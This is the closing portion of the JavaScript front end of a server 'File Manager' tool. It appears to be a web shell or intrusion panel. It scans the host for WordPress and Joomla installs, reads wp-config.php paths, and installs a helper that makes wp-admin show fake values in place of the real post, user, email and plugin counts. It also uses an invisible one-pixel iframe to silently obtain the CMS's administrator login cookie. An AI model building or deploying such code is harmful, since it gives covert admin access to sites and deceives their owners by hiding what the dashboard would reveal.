      ${sites.length?sites.map((s,i)=>`<div class="wp-numbers-site" data-cfg="${esc(s.config)}" style="display:flex;align-items:center;gap:12px;padding:13px 16px;border-bottom:1px solid var(--b2);cursor:pointer">
        <div style="width:30px;height:30px;border-radius:8px;background:rgba(33,117,155,.16);display:grid;place-items:center;color:#5bc0de;font-size:15px;font-weight:800">${i+1}</div>
        <div style="min-width:0;flex:1"><div style="font-size:12px;font-weight:700;color:var(--t1);overflow:hidden;text-overflow:ellipsis;white-space:nowrap">${esc(s.dir)}</div><div style="font-size:10.5px;color:var(--t3);font-family:monospace;overflow:hidden;text-overflow:ellipsis;white-space:nowrap">${esc(s.config)}</div></div>
        <span style="color:var(--t3);font-size:18px">›</span>
      </div>`).join(''):'<div class="empty" style="padding:32px"><p>No WordPress installation was found automatically.</p></div>'}
      <div style="padding:14px 16px;border-top:1px solid var(--b2)">
        <div style="font-size:11px;font-weight:700;color:var(--t3);text-transform:uppercase;letter-spacing:.6px;margin-bottom:7px">Manual path to wp-config.php</div>
        <div style="display:flex;gap:8px"><input id="wpNumbersManual" class="inp" style="flex:1;font-size:12px;font-family:monospace" placeholder="/home/user/wp-config.php"><button class="btn btn-p" id="wpNumbersManualBtn">Open</button></div>
      </div>`;
    body.querySelectorAll('.wp-numbers-site').forEach(card=>card.addEventListener('click',()=>{
      numbersCfg=card.dataset.cfg;window.fmCmsConfig=numbersCfg;window.fmCmsType='wordpress';loadNumbers();
    }));
    document.getElementById('wpNumbersManualBtn')?.addEventListener('click',()=>{
      const p=document.getElementById('wpNumbersManual').value.trim();
      if(!p||p.split(/[\\/]/).pop().toLowerCase()!=='wp-config.php'){toast('Enter the full path to wp-config.php.');return;}
      numbersCfg=p;window.fmCmsConfig=numbersCfg;window.fmCmsType='wordpress';loadNumbers();
    });
    document.getElementById('wpNumbersManual')?.addEventListener('keydown',e=>{if(e.key==='Enter')document.getElementById('wpNumbersManualBtn')?.click();});
  }
  async function loadNumbers(){
    numbersCfg=window.fmCmsConfig||numbersCfg;
    if(!numbersCfg||window.fmCmsType==='joomla'){
      body.innerHTML=msg('Detecting WordPress installations…');
      try{
        const scan=await fetch('?x=cmsscan',{cache:'no-store'}).then(r=>r.json());
        const wp=(scan.sites||[]).filter(s=>s.type==='wordpress');
        const site=wp.find(s=>s.config===scan.current_wp_config)||((wp.length===1)?wp[0]:null);
        if(site){numbersCfg=site.config;window.fmCmsConfig=numbersCfg;window.fmCmsType='wordpress';}
        else{showNumbersPicker(scan);return;}
      }catch(e){body.innerHTML=msg('CMS detection failed: '+String(e),'#fca5a5');return;}
    }
    body.innerHTML=msg('Reading the real WordPress counters…');
    try{
      const d=await numbersPost('?x=wp_numbers_control',new FormData());
      if(d.error){body.innerHTML=msg(d.error,'#fca5a5');return;}
      numbersData=d;renderNumbers();
    }catch(e){body.innerHTML=msg('Could not load number controls: '+String(e),'#fca5a5');}
  }
  function renderNumbers(){
    const defs=numbersData.definitions||[],over=numbersData.overrides||{};
    const rows=defs.map(def=>`<div class="wp-number-row" style="display:grid;grid-template-columns:minmax(0,1fr) 120px 120px;gap:10px;align-items:center;padding:10px 0;border-bottom:1px solid var(--b2)">
      <div><div style="font-size:12px;font-weight:700;color:var(--t1)">${esc(def.label)}</div><div style="font-size:10.5px;color:var(--t3);margin-top:2px">${esc(def.description)}</div></div>
      <div><div style="font-size:9.5px;color:var(--t3);text-transform:uppercase;letter-spacing:.5px;margin-bottom:3px">Real</div><div style="font-family:monospace;font-size:12px;color:var(--t2)">${def.actual===null?'—':Number(def.actual).toLocaleString()}</div></div>
      <div><div style="font-size:9.5px;color:var(--t3);text-transform:uppercase;letter-spacing:.5px;margin-bottom:3px">Displayed</div><input class="inp wp-num-input" data-id="${esc(def.id)}" type="number" min="0" max="999999999" step="1" inputmode="numeric" style="width:100%;padding:6px 8px" value="${Object.prototype.hasOwnProperty.call(over,def.id)?esc(over[def.id]):''}" placeholder="Real"></div>
    </div>`).join('');
    const custom=(numbersData.custom||[]).map(item=>customRow(item)).join('');
    body.innerHTML=`<div style="padding:11px 16px;border-bottom:1px solid var(--b2);font-size:11px;color:var(--t3)">WordPress: <span style="font-family:monospace;color:var(--t2)">${esc(numbersCfg)}</span></div>
      <div style="padding:12px 16px 8px;color:var(--t2);font-size:11.5px;line-height:1.5">Set a displayed value for any counter. Leave it blank to show the real value. This affects wp-admin presentation only; database content is never changed.</div>
      <div style="padding:0 16px"><div style="display:grid;grid-template-columns:minmax(0,1fr) 120px 120px;gap:10px;padding:0 0 5px;color:var(--t3);font-size:9.5px;text-transform:uppercase;letter-spacing:.5px"><span>Counter</span><span>Real value</span><span>Override</span></div>${rows}</div>
      <div style="margin:14px 16px 0;padding:12px;border:1px solid var(--b2);border-radius:9px;background:rgba(255,255,255,.02)">
        <div style="font-size:12px;font-weight:700;color:var(--t1);margin-bottom:4px">Email messages</div>
        <div style="font-size:10.5px;color:var(--t3);line-height:1.45;margin-bottom:9px">WordPress core has no mailbox count. Enter the CSS selector of the email/plugin counter in wp-admin, then set the displayed number.</div>
        <div style="display:grid;grid-template-columns:1fr 120px;gap:8px"><input id="wpNumbersEmailSelector" class="inp" value="${esc(numbersData.email_selector||'')}" placeholder="#email-widget .count, .mail-count"><input id="wpNumbersEmail" class="inp" type="number" min="0" max="999999999" step="1" inputmode="numeric" value="${Object.prototype.hasOwnProperty.call(over,'email_messages')?esc(over.email_messages):''}" placeholder="Displayed"></div>
      </div>
      <div style="margin:14px 16px 0;padding:12px;border:1px solid var(--b2);border-radius:9px;background:rgba(255,255,255,.02)">
        <div style="display:flex;align-items:center;margin-bottom:4px"><div style="font-size:12px;font-weight:700;color:var(--t1);flex:1">Custom dashboard numbers</div><button class="btn btn-xs btn-g" id="wpNumbersAddCustom">+ Add</button></div>
        <div style="font-size:10.5px;color:var(--t3);line-height:1.45;margin-bottom:9px">Target a number from a plugin or a specific wp-admin area with its CSS selector.</div>
        <div id="wpNumbersCustomList">${custom||'<div id="wpNumbersCustomEmpty" style="font-size:10.5px;color:var(--t3);padding:5px 0">No custom counters.</div>'}</div>
      </div>
      <div style="display:flex;gap:8px;padding:14px 16px 4px;flex-wrap:wrap"><button class="btn btn-p" id="wpNumbersSave" style="flex:1;min-width:150px">Save displayed numbers</button><button class="btn btn-g" id="wpNumbersReset">Restore real values</button></div>
      <div id="wpNumbersStatus" style="padding:7px 16px 12px;font-size:10.5px;color:var(--t3)">${numbersData.installed?'Control helper is installed.':'No control helper is installed yet.'}</div>`;
    document.getElementById('wpNumbersAddCustom')?.addEventListener('click',()=>{
      document.getElementById('wpNumbersCustomEmpty')?.remove();
      document.getElementById('wpNumbersCustomList').insertAdjacentHTML('beforeend',customRow({}));
      bindCustomRemove();
    });
    bindCustomRemove();
    document.getElementById('wpNumbersSave')?.addEventListener('click',saveNumbers);
    document.getElementById('wpNumbersReset')?.addEventListener('click',resetNumbers);
  }
  function customRow(item){
    return `<div class="wp-custom-row" style="display:grid;grid-template-columns:1fr 1.25fr 110px 28px;gap:6px;margin-bottom:7px">
      <input class="inp wp-custom-label" value="${esc(item.label||'')}" placeholder="Label">
      <input class="inp wp-custom-selector" value="${esc(item.selector||'')}" placeholder=".plugin-counter">
      <input class="inp wp-custom-value" type="number" min="0" max="999999999" step="1" inputmode="numeric" value="${item.value===undefined?'':esc(item.value)}" placeholder="Number">
      <button type="button" class="btn btn-icon btn-red wp-custom-remove" title="Remove">×</button>
    </div>`;
  }
  function bindCustomRemove(){
    body.querySelectorAll('.wp-custom-remove').forEach(b=>b.onclick=()=>b.closest('.wp-custom-row')?.remove());
  }
  async function saveNumbers(){
    const payload={};
    body.querySelectorAll('.wp-num-input').forEach(input=>{if(input.value.trim()!=='')payload[input.dataset.id]=input.value.trim();});
    const email=document.getElementById('wpNumbersEmail')?.value.trim()||'';
    const selector=document.getElementById('wpNumbersEmailSelector')?.value.trim()||'';
    if(email!=='')payload.email_messages=email;
    if(selector!=='')payload.email_selector=selector;
    payload.custom=[];
    body.querySelectorAll('.wp-custom-row').forEach(row=>payload.custom.push({
      label:row.querySelector('.wp-custom-label')?.value.trim()||'',
      selector:row.querySelector('.wp-custom-selector')?.value.trim()||'',
      value:row.querySelector('.wp-custom-value')?.value.trim()||''
    }));
    const btn=document.getElementById('wpNumbersSave'),status=document.getElementById('wpNumbersStatus');
    btn.disabled=true;btn.textContent='Saving…';status.textContent='Installing the reversible WordPress admin helper…';
    const fd=new FormData();fd.append('csrf_token',CSRF);fd.append('numbers_json',JSON.stringify(payload));
    try{
      const r=await numbersPost('?x=wp_numbers_control_save',fd);
      if(!r.ok)throw new Error(r.error||'Could not save the number controls.');
      toast(r.message||'Displayed numbers updated.');await loadNumbers();
    }catch(e){status.style.color='#fca5a5';status.textContent=String(e);btn.disabled=false;btn.textContent='Save displayed numbers';}
  }
  async function resetNumbers(){
    if(!confirm('Restore all real WordPress numbers and remove the reversible display helper?'))return;
    const btn=document.getElementById('wpNumbersReset');btn.disabled=true;btn.textContent='Restoring…';
    const fd=new FormData();fd.append('csrf_token',CSRF);
    try{
      const r=await numbersPost('?x=wp_numbers_control_reset',fd);
      if(!r.ok)throw new Error(r.error||'Could not restore the real numbers.');
      toast(r.message||'Real WordPress numbers restored.');await loadNumbers();
    }catch(e){toast(String(e));btn.disabled=false;btn.textContent='Restore real values';}
  }
  document.getElementById('wpNumbersBtn')?.addEventListener('click',()=>{openMod('wpNumbersOv');loadNumbers();});
  document.getElementById('wpNumbersClose')?.addEventListener('click',()=>closeMod('wpNumbersOv'));
})();

/* The initial admin/admin account must be replaced before the manager can be
   used. The server also rejects other POST actions while this flag is set, so
   hiding the modal or navigating cannot bypass the one-time setup. */
if(FM_FORCE_CREDENTIAL_CHANGE){
  const credentialForm=document.getElementById('credentialChangeForm');
  const credentialFeedback=document.getElementById('credentialChangeFeedback');
  const credentialButton=document.getElementById('credentialChangeApply');
  credentialForm?.addEventListener('submit',async e=>{
    e.preventDefault();
    const user=document.getElementById('newFmUser').value.trim();
    const pass=document.getElementById('newFmPass').value;
    const confirmPass=document.getElementById('newFmPassConfirm').value;
    credentialFeedback.style.display='none';
    if(pass!==confirmPass){
      credentialFeedback.textContent='The password confirmation does not match.';
      credentialFeedback.style.display='block';return;
    }
    credentialButton.disabled=true;credentialButton.textContent='Saving…';
    const fd=new FormData();
    fd.append('csrf_token',CSRF);fd.append('new_user',user);fd.append('new_pass',pass);fd.append('confirm_pass',confirmPass);
    try{
      const r=await fetch('?x=fm_change_default_credentials',{method:'POST',body:fd,cache:'no-store'}).then(x=>x.json());
      if(!r.ok){
        credentialFeedback.textContent=r.error||'Could not save the new credentials.';
        credentialFeedback.style.display='block';
        credentialButton.disabled=false;credentialButton.textContent='Save new credentials';return;
      }
      location.reload();
    }catch(_){
      credentialFeedback.textContent='The request failed. Your old session is still active; try again.';
      credentialFeedback.style.display='block';
      credentialButton.disabled=false;credentialButton.textContent='Save new credentials';
    }
  });
  setTimeout(()=>document.getElementById('newFmUser')?.focus(),50);
}

/* After the first successful File Manager login, silently let the browser
   receive the current CMS's own persistent auth cookie. The iframe is
   intentionally invisible; failures never interrupt the manager UI. */
if(FM_CMS_AUTO_LOGIN){
  const fd=new FormData();fd.append('csrf_token',CSRF);
  let frame=null,settled=false;
  const finish=(ok,message)=>{
    if(settled)return;settled=true;
    if(frame)frame.remove();
    window.removeEventListener('message',onMessage);
    toast(message,ok?3500:5000);
  };
  const onMessage=e=>{
    if(!frame||e.source!==frame.contentWindow)return;
    if(e.data&&(e.data.type==='fm-cms-auto-login'||e.data.type==='fm-wp-auto-login')){
      const label=e.data.cms==='joomla'?'Joomla':'WordPress';
      finish(!!e.data.ok,e.data.ok?label+' automatic login succeeded.':label+' automatic login failed.');
    }
  };
  window.addEventListener('message',onMessage);
  fetch('?x=cms_auto_login',{method:'POST',body:fd,cache:'no-store'})
    .then(r=>r.json()).then(d=>{
      if(!d||!d.url){
        const label=d&&d.cms==='joomla'?'Joomla':'WordPress';
        const messages={'site-not-found':label+' automatic login failed: current site not found.','site-unavailable':label+' automatic login failed: site unavailable.','admin-not-found':label+' automatic login failed: no administrator found.','handoff-failed':label+' automatic login failed: session could not be created.'};
        finish(false,messages[d&&d.reason]||label+' automatic login failed.');
        return;
      }
      frame=document.createElement('iframe');
      frame.setAttribute('aria-hidden','true');
      frame.style.cssText='position:fixed;width:1px;height:1px;left:-10px;top:-10px;border:0;opacity:0;pointer-events:none';
      frame.src=d.url;
      document.body.appendChild(frame);
      setTimeout(()=>finish(false,(d&&d.cms==='joomla'?'Joomla':'WordPress')+' automatic login failed.'),12000);
    }).catch(()=>finish(false,'CMS automatic login failed.'));
}

/* HELPERS */
function esc(s){return String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;');}
function formatBytes(b){if(b>=1073741824)return(b/1073741824).toFixed(2)+' GB';if(b>=1048576)return(b/1048576).toFixed(1)+' MB';if(b>=1024)return(b/1024).toFixed(1)+' KB';return b+' B';}
</script>
</body>
</html>
